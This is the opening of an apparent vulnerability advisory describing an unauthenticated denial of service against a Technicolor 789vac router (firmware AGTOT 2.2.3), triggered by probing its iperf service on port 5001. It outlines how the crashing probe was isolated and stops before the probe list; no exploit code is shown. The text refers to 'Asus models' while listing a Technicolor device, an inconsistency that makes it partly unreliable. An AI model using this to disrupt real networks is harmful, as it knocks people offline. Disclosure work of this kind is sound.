## Affected products

We have not yet tested Asus models other than those listed. However we suspect it may also work on other models with similar firmware version higher than 2.0.0.

```
    Technicolor 789vac v2
```



## Overview

An issue was discovered in the Technicolor 789vac router running firmware AGTOT 2.2.3. An unauthenticated remote attacker can send a crafted probe or perform a service detection scan, targeting the iperf service on port 5001. This triggers an immediate failure in the routerâ€™s network stack, causing disruption of all network connectivity (wired and wireless) and resulting in a full router reboot.

**This PoC can result in a DoS.**

**Given the vendor's policies, we wont't show the Source Code of the binary scripts. However, we'll inspect the web page source. We'll provide the insights before and after the procedure.**

## Strategy

We analyzed the improper behaviours. 
Simultaneously, we captured the network traffic log all packets exchanged. 
We saved the captured data in PCAPNG format for further analysis. 
Collect all the probes analyzing pcapng (e.g. Scapy)
We filtered precisely the crashing cause by sending one by one and then crafted the exploit.

Here's the list of possible probes tested:
